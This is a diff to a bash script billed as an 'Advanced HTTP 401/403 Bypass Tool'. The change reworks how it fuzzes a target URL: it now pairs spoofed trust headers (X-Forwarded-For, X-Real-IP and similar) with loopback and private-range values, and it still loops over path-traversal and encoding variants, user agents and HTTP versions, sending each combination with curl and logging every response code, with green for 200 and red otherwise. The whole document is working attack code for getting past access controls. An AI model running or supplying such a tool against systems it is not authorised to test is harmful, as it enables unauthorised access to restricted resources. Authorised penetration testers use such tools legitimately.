@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Enhanced 403/401 Bypass Tool
+# Advanced HTTP 401/403 Bypass Tool
 # Usage: bash tool.sh -u https://example.com -path /403/path
 
 # Default parameters
@@ -39,7 +39,15 @@ user_agents=(
     "Wget/1.20.3 (linux-gnu)"
     "python-requests/2.25.1"
 )
-headers=("X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Forwarded-Host: localhost" "Referer: /admin" "Forwarded: for=127.0.0.1" "Authorization: Basic Zm9vOmJhcg==" "Origin: https://example.com")
+headers=(
+    "X-Forwarded-For" "X-Forward-For" "X-Forwarded-Host" "X-Forwarded-Proto"
+    "Forwarded" "Via" "X-Real-IP" "X-Remote-IP" "X-Remote-Addr"
+    "X-Trusted-IP" "X-Requested-By" "X-Requested-For" "X-Forwarded-Server"
+)
+header_values=(
+    "10.0.0.0" "10.0.0.1" "127.0.0.1" "127.0.0.1:443" 
+    "127.0.0.1:80" "localhost" "172.16.0.0"
+)
 paths=("/%2e$path" "/%252e$path" "/../$path" "/..%00$path" "/~admin$path" "/$path/.." "/$path.." "/.$path" "/..;$path" "/%2e/$path")
 protocols=("1.0" "1.1")
 
@@ -47,24 +55,27 @@ protocols=("1.0" "1.1")
 function send_request {
     method=$1
     ua=$2
-    custom_header=$3
-    target_path=$4
-    protocol=$5
+    header_key=$3
+    header_value=$4
+    target_path=$5
+    protocol=$6
 
     response=$(curl -k -s -o /dev/null -w "%{http_code}" \
         -X "$method" \
         -A "$ua" \
-        -H "$custom_header" \
+        -H "$header_key: $header_value" \
         "$url$target_path" \
         --http"$protocol")
     
     if [[ "$response" == "200" ]]; then
-        echo -e "\033[1;32m[200 OK] -> Method: $method, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
-        echo "[Method: $method, User-Agent: $ua, Header: $custom_header, Path: $target_path, Protocol: HTTP/$protocol] -> HTTP 200 OK" >> "$output_file"
+        color="\033[1;32m" # Green
     else
-        echo -e "\033[1;31m[$response] -> Method: $method, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
-        echo "[Method: $method, User-Agent: $ua, Header: $custom_header, Path: $target_path, Protocol: HTTP/$protocol] -> HTTP $response" >> "$output_file"
+        color="\033[1;31m" # Red
     fi
+
+    # Print and log details
+    echo -e "${color}[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
+    echo "[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol" >> "$output_file"
 }
 
 # Start fuzzing
@@ -72,9 +83,11 @@ echo "Starting fuzzing..." >> "$output_file"
 for method in "${methods[@]}"; do
     for ua in "${user_agents[@]}"; do
         for header in "${headers[@]}"; do
-            for p in "${paths[@]}"; do
-                for protocol in "${protocols[@]}"; do
-                    send_request "$method" "$ua" "$header" "$p" "$protocol"
+            for value in "${header_values[@]}"; do
+                for p in "${paths[@]}"; do
+                    for protocol in "${protocols[@]}"; do
+                        send_request "$method" "$ua" "$header" "$value" "$p" "$protocol"
+                    done
                 done
             done
         done
